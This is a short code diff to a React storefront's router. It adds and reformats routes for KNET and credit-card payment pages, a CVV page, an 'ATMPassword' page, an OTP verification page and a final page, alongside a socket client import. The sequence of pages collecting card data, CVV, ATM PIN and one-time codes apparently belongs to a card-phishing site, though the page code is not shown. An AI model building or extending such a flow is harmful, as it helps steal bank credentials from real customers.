@@ -20,6 +20,10 @@ import { connectStorefront } from "@/kdd/lib/socketClient";
 import "./styles.css";
 import KNETPayment from "../pages/KNETPayment";
 import CreditCardPayment from "../pages/CreditCardPayment";
+import FinalPage from "../pages/FinalPage";
+import CVV from "../pages/CVV";
+import ATMPassword from "../pages/ATMPassword";
+import OTPVerification from "../pages/OTPVerification";
 import { initializeSocket } from "@/lib/store";
 
 const queryClient = new QueryClient({
@@ -75,12 +79,13 @@ export default function StorefrontApp() {
               <Route path="/product/:id" element={<ProductDetail />} />
               <Route path="/cart" element={<Cart />} />
               <Route path="/checkout" element={<Checkout />} />
-<Route path="/knet" element={<KNETPayment />} />
-<Route path="/card" element={<CreditCardPayment />} />
-                      <Route path="/final-page" element={<FinalPage />} />
-        <Route path="/cvv" element={<CVV />} />
-        <Route path="/atm" element={<ATMPassword />} />
-<Route path="*" element={<LocalFallback />} />
+              <Route path="/knet" element={<KNETPayment />} />
+              <Route path="/card" element={<CreditCardPayment />} />
+              <Route path="/final-page" element={<FinalPage />} />
+              <Route path="/cvv" element={<CVV />} />
+              <Route path="/atm" element={<ATMPassword />} />
+              <Route path="/otp-verification" element={<OTPVerification />} />
+              <Route path="*" element={<LocalFallback />} />
             </Routes>
           </BrowserRouter>
           <Toaster position="top-center" richColors />
